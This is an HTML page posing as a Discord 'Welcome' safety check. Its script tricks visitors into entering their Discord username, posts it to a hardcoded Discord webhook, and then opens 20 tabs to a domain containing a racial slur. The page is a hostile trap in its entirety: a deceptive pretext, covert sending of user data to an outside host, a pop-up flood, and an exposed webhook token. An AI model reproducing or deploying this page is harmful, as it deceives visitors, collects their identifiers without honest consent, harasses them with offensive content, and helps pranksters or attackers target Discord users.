<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }

    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
      width: 300px;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }

    button {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }

    #status {
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Welcome!</h1>
    <p>Type your real Discord username for safety reasons:</p>
    <input type="text" id="discordUser" placeholder="Discord Username" required>
    <button onclick="submitDiscordUser()">Submit</button>
    <p id="status"></p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';

    // Validate and send Discord username, then open 20 tabs
    async function submitDiscordUser() {
      const discordUser = document.getElementById('discordUser').value.trim();
      const status = document.getElementById('status');

      if (!discordUser || discordUser.length < 6) {
        status.textContent = 'Please enter a valid Discord username.';
        status.style.color = 'red';
        return;
      }

      // Send the Discord username to the webhook
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `**Discord Username Submitted:** ${discordUser}` }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }

      // Update the status message
      status.textContent = 'Thank you for submitting your Discord username.';
      status.style.color = 'green';

      // Open 20 tabs
      setTimeout(() => openTabs(), 2000);
    }

    // Open 20 tabs to a specified URL
    function openTabs() {
      const url = "https://www.niggafart.com"; // Target URL
      for (let i = 0; i < 20; i++) {
        const newTab = window.open(url, '_blank');
        if (!newTab) {
          alert("Popup blocker prevented some tabs from opening.");
          break;
        }
      }
    }
  </script>
</body>
</html>
